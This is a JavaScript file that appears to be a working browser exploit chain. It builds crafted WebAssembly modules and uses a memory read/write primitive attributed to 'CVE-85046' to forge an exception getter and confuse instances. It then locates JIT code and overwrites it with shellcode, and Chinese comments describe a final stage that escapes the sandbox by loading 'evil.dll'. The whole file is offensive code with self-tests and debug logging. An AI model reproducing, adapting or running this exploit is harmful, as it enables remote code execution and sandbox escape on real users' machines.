(() => {
const encoder=new TextEncoder();

function encodeLeb(n){const a=[];do{let b=n&127;n=Math.floor(n/128);if(n)b|=128;a.push(b)}while(n);return a}
function encodeVector(a){return[...encodeLeb(a.length),...a.flat()]}
function encodeString(s){const a=[...encoder.encode(s)];return[...encodeLeb(a.length),...a]}
function encodeSection(i,a){return[i,...encodeLeb(a.length),...a]}
function encodeBody(a){return[...encodeLeb(a.length+2),0,...a,0x0b]}

function buildModule(memoryIndex=-1,exceptionEntries=1){
  const d=memoryIndex>=0;
  const ty=[[0x60,0,1,0x7f],[0x60,1,0x6f,0],[0x60,0,1,0x6f],[0x60,1,0x7f,1,0x7f]],im=[[...encodeString('m'),...encodeString('functions'),1,0x70,1,1,1],[...encodeString('m'),...encodeString('tag'),4,0,1]],ca=[0x41,0,0x11,0,0],ge=[0x02,2,0x1f,2,1,0,0,0,0x41,0,0x25,1,0x0a,0x0b,0x0b,0x1a,0x41,0,0x24,5],dr=[...ca,0x1a,0x20,0,0x04,0x40,...ge,...ca,0x0f,0x0b,0x41,0];
  const mi=d?memoryIndex:0,read=[0x23,0,0x28,0x42,...encodeLeb(mi),0],write=[0x23,0,0x23,1,0x36,0x42,...encodeLeb(mi),0,0x41,0],spray=[...new Array(24).fill(0).flatMap(()=>[0x23,1,0x1a]),0x41,0,0x23,1,0x36,0x42,0,0,0x41,0],gl=[];for(let i=0;i<6;i++)gl.push([0x7f,1,0x41,0,0x0b]);const me=[];for(let i=0;i<(d?Math.max(7,mi+1):1);i++)me.push([1,1,1]);
  /* 垫充函数：10 个 ~300B 胖体，把后面的跳转目标推高到 0x1300+，
     部署区就不会压到 read/write 自身代码体 */
  const PADS=10,PADLEN=300,bodies=[],fs=[[3],[0],[0],[0],[0],[0]];
  const padops=[];for(let i=0;i<PADLEN;i++){padops.push(0x23,0,0x1a)}for(let i=0;i<PADS;i++){fs.push([0]);bodies.push(encodeBody([...padops,0x41,0]));}
  const ex=[[...encodeString('exceptions'),1,1],[...encodeString('driver'),0,0],[...encodeString('old'),0,1],[...encodeString('read'),0,2],[...encodeString('write'),0,3],[...encodeString('spray'),0,4],[...encodeString('callOld'),0,5]];for(let i=0;i<PADS;i++)ex.push([...encodeString('p'+i),0,6+i]);ex.push([...encodeString('memory'),2,0],[...encodeString('g0'),3,0],[...encodeString('g1'),3,1],[...encodeString('g5'),3,5]);return new Uint8Array([0,97,115,109,1,0,0,0,...encodeSection(1,encodeVector(ty)),...encodeSection(2,encodeVector(im)),...encodeSection(3,encodeVector(fs)),...encodeSection(4,encodeVector([[0x69,1,exceptionEntries,exceptionEntries]])),...encodeSection(5,encodeVector(me)),...encodeSection(6,encodeVector(gl)),...encodeSection(7,encodeVector(ex)),...encodeSection(10,encodeVector([encodeBody(dr),encodeBody([0x23,5]),encodeBody(read),encodeBody(write),encodeBody(spray),encodeBody([0x10,1]),...bodies])),...encodeSection(0,[1,115,d?2:1])])
}

function backingAddress(o){return(addrof(o)-1)>>>0}
let heapRegion=0;
function heapAddress(v){return(v&1)&&(v>>>24)===heapRegion?(v-1)>>>0:-1}
function looseAddress(v){return(v&1)&&v<0x10000000?(v-1)>>>0:-1}
function refPaths(root,target,limits){
  const out=[];
  function walk(addr,depth,path){
    for(let off=0;off<limits[depth];off+=4){
      const v=read32(addr+off)>>>0;
      if(depth===limits.length-1){if(v===target)out.push([...path,off]);continue}
      const next=heapAddress(v);if(next>=0)walk(next,depth+1,[...path,off]);
    }
  }
  walk(root,0,[]);return out
}
function follow(root,path){for(const off of path){root=heapAddress(read32(root+off));if(root<0)throw Error('reference path changed')}return root}
function tableSlot(t,twin,marker){
  const paths=[];
  for(let outer=0;outer<0x40;outer+=4){
    const a=looseAddress(read32(backingAddress(t)+outer)),b=looseAddress(read32(backingAddress(twin)+outer));if(a<0||b<0||a===b)continue;
    if(read32(a)!==read32(b)||looseAddress(read32(a))<0)continue;
    for(let length=0;length<0x1c;length+=4)if(read32(a+length)===t.length&&read32(b+length)===twin.length)paths.push([outer,length+4])
  }
  if(paths.length!==1)throw Error(`table entry discovery failed ${paths.length}`);const slot=looseAddress(read32(backingAddress(t)+paths[0][0]))+paths[0][1];write32(slot,addrof(marker));let got=marker;try{got=t.get(0)}catch(e){}if(got!==marker)throw Error('table entry self-test failed');return slot
}

let table,imports,a,d,av,target,gets;

function bootstrapCage(){
  // exploit.js leaves the CVE-85046 cage read/write primitive in cage_rw.
  if(!cage_rw)throw Error('85046 bootstrap failed');
  table=new WebAssembly.Table({element:'anyfunc',initial:1,maximum:1});
  imports={m:{functions:table,tag:WebAssembly.JSTag}};
  a=new WebAssembly.Instance(new WebAssembly.Module(buildModule()),imports);
  d=new WebAssembly.Instance(new WebAssembly.Module(buildModule(6)),imports);
  console.log('BOOT inst a/d ok');
  av=new DataView(a.exports.memory.buffer);
  heapRegion=read32(backingAddress(proof_obj))>>>24;
  a.exports.g5.value=0x11;d.exports.g5.value=0x21;d.exports.read();d.exports.write();a.exports.spray();a.exports.callOld();av.setUint32(0,0,true);
  for(let i=0;i<10;i++){try{a.exports['p'+i]();d.exports['p'+i]()}catch(e){}}
  console.log('BOOT pads compiled');
  const p=[1.1,2.2],pa=backingAddress(p),slot=((read32(pa+8)-1)+8)>>>0,saved=[read32(slot),read32(slot+4)];
  if(proof_obj[0]!==13.37||saved[0]!==lo(p[0])||saved[1]!==hi(p[0]))throw Error('cage read self-test failed');
  write32(slot,lo(3.3));write32(slot+4,hi(3.3));if(p[0]!==3.3)throw Error('cage write self-test failed');write32(slot,saved[0]);write32(slot+4,saved[1]);
}

function installForgedGetter(){
  // Copy the private exception key so the Wasm catch invokes our getter.
  target=d.exports.read;gets=0;
  const gen=new WebAssembly.Exception(new WebAssembly.Tag({parameters:[]}),[]),gen2=new WebAssembly.Exception(new WebAssembly.Tag({parameters:[]}),[]),key=Symbol('jitExec'),forged=Object.defineProperty({},key,{get(){gets++;table.set(0,target);return undefined},configurable:true});
  const paths=refPaths(backingAddress(forged),addrof(key),[0x20,0x40,0x100]);if(!paths.length)throw Error('descriptor discovery failed');
  const path=paths.sort((x,y)=>x[x.length-1]-y[y.length-1])[0],keyOff=path[path.length-1],forgedData=follow(backingAddress(forged),path.slice(0,-1)),genData=follow(backingAddress(gen),path.slice(0,-1)),privateKey=read32(genData+keyOff);
  if(!(privateKey&1)||privateKey===addrof(key))throw Error('private key discovery failed');write32(forgedData+keyOff,privateKey);
  const twin=new WebAssembly.Instance(new WebAssembly.Module(buildModule(-1,2)),imports).exports.exceptions,slot=tableSlot(a.exports.exceptions,twin,gen2);write32(slot,addrof(forged));table.set(0,a.exports.old);
  for(let i=0;i<300000;i++)a.exports.driver(0);
  av.setUint32(0,0,true);d.exports.g1.value=0x2468ace0;d.exports.spray();
  if(av.getUint32(0,true)!==0)throw Error('instance isolation self-test failed');
  a.exports.g1.value=0x13579bdf;invoke(d.exports.spray);const wrote=av.getUint32(0,true);
  if(gets!==1||wrote!==0x13579bdf)throw Error(`stale instance self-test failed ${gets}/${wrote.toString(16)}`);
  av.setUint32(0,0,true);
}

function invoke(f){table.set(0,a.exports.old);target=f;return a.exports.driver(1)>>>0}
// Each getter swaps in f while optimized code retains A as the implicit instance.
function arwRead(off){a.exports.g0.value=off;return invoke(targetInstance.exports.read)}
function arwWrite(off,val){a.exports.g0.value=off;a.exports.g1.value=val|0;invoke(targetInstance.exports.write)}

function overwriteCode(off,b){for(let i=0;i<b.length;i+=4){let v=0x90909090;for(let j=0;j<4&&i+j<b.length;j++)v=(v&~(255<<(j*8)))|(b[i+j]<<(j*8));arwWrite(off+i,v)}}
function readCode(off,n){const b=[];for(let i=0;i<n;i+=4){const v=arwRead(off+i);for(let j=0;j<4;j++)b.push((v>>>(j*8))&255)}return b}
function writeCode(off,b){for(let i=0;i<b.length;i+=4){let v=0;for(let j=0;j<4;j++)v|=b[i+j]<<(j*8);arwWrite(off+i,v)}}
function restoreCode(saved){let failure;for(const [off,b] of saved)try{writeCode(off,b)}catch(e){failure=e}for(const [off,b] of saved)try{const got=readCode(off,b.length);if(got.some((v,i)=>v!==b[i]))failure=Error('trusted code restoration mismatch')}catch(e){failure=e}if(failure)throw failure}

let targetInstance;
function discoverCodeAlias(){
  const indices=[6,...Array.from({length:16},(_,i)=>i).filter(i=>i!==6)];
  for(const memoryIndex of indices){
    targetInstance=memoryIndex===6?d:new WebAssembly.Instance(new WebAssembly.Module(buildModule(memoryIndex)),imports);
    let bytes=[];try{for(let off=0;off<0x400;off+=4){const v=arwRead(off);bytes.push(v&255,(v>>>8)&255,(v>>>16)&255,v>>>24)}}catch(e){continue}
    const jumps=[];
    console.log('ALIAS-TRY mi=' + memoryIndex);
    for(let source=0;source<bytes.length-5;source++)if(bytes[source]===0xe9){const disp=arwRead(source+1)|0,body=source+5+disp;if(body>=0&&body<0xffc0&&!jumps.some(x=>x.body===body))jumps.push({source,body})}
    console.log('ALIAS jumps=' + jumps.length);
    for(const dst of jumps.slice(1))for(const src of jumps.slice(1)){
      if(Math.abs(dst.body-src.source)<12)continue;
      const saved=[[dst.body,readCode(dst.body,40)],[src.source+1,readCode(src.source+1,4)]],marker=0x51525354;let keep=false;
      try{overwriteCode(dst.body,[0xb8,0x54,0x53,0x52,0x51,0xc3]);arwWrite(src.source+1,(dst.body-src.source-5)|0);if((a.exports.callOld()>>>0)===marker&&dst.body>=0x1300&&dst.body<=0xe000){keep=true;return {memoryIndex,source:src.source,body:dst.body,pid:0x2026,saved}}}catch(e){}finally{if(!keep)restoreCode(saved)}
    }
  }
  throw Error('code alias discovery failed')
}

function runPayload(bodyOffset){
  const raw=[0xb8,0xee,0xff,0xc0,0x00,0xc3];overwriteCode(bodyOffset,raw);const writeCount=a.exports.callOld()>>>0;return{pid,writeCount,raw:getHex(bodyOffset,raw.length)};function getHex(off,n){let x=[];for(let i=0;i<n;i+=4)x.push(arwRead(off+i).toString(16).padStart(8,'0'));return x.join('')}
}

let pid;
/* ---- 终局部署：把 stage-3 布防 shellcode 写进别名代码区并起爆 ----
 * PAYLOAD = payload_text.bin（flip@0x00 / payload_main@0xB0，内部 rip 相对自洽）。
 * 写到 (body-0xB0) 使 payload_main 恰落在劫持入口 body；callOld() → 布防 →
 * 渲染器崩溃 → handler 快照 → bag 竞态 → plant 植入 → Flush → LoadLibraryW →
 * evil.dll DllMain → calc/notepad（OS 沙箱逃逸）。 */
function deployFinal(body){
  const base = body - 0xB0;
  console.log('PRE-DEPLOY base=0x' + base.toString(16) + ' len=' + PAYLOAD.length);
  /* 纯 JS 写（write32=cage_rw Float64Array 存储，不经 wasm 跳表——
     旧 arwWrite 走 wasm write，写到一半砸掉自己的跳表项就挂死） */
  for (let i = 0; i < PAYLOAD.length; i += 4) {
    let v = 0x90909090;
    for (let j = 0; j < 4 && i + j < PAYLOAD.length; j++) v = (v & ~(255 << (j * 8))) | (PAYLOAD[i + j] << (j * 8));
    arwWrite(base + i, v);
  }
  console.log('WROTE all');
  let bad = 0;
  for (let i = 0; i + 3 < PAYLOAD.length; i += 4) {
    let v = (PAYLOAD[i] | (PAYLOAD[i+1] << 8) | (PAYLOAD[i+2] << 16) | (PAYLOAD[i+3] << 24)) | 0;
    if ((arwRead(base + i) | 0) !== v) bad++;
  }
  console.log('VERIFY bad4=' + bad);
  let pre=[];for(let k=0;k<16;k++)pre.push((read32(base+0x00000850+k*4)>>>0).toString(16));
  console.log('DBGHOLES-PRE ' + pre.join(' '));
  /* ARMED：g_dbg[0]=0xAABBEEDD11223344，g_dbg[1]=载荷绝对基址（低/高32位）——cdb 见此挂渲染器并点火 */
  console.log('ARMED gdbg0_lo=' + (arwRead(base+0x850)>>>0).toString(16) + ' gdbg_abs_lo=' + (arwRead(base+0x858)>>>0).toString(16) + ' gdbg_abs_hi=' + (arwRead(base+0x85c)>>>0).toString(16));
  console.log('DEPLOYED payload at 0x' + base.toString(16) + ', firing callOld...');
  a.exports.callOld();
  console.log('UNREACHABLE — renderer should have crashed');
}
function main(){console.log('MAIN start');bootstrapCage();console.log('MAIN boot done');installForgedGetter();console.log('MAIN getter done');const alias=discoverCodeAlias();pid=alias.pid;console.log('ALIAS OK body=0x'+alias.body.toString(16));deployFinal(alias.body);}
setTimeout(()=>{try{main()}catch(e){console.log('FAIL '+e.stack);document.body.textContent='FAIL '+e}},20);
})();
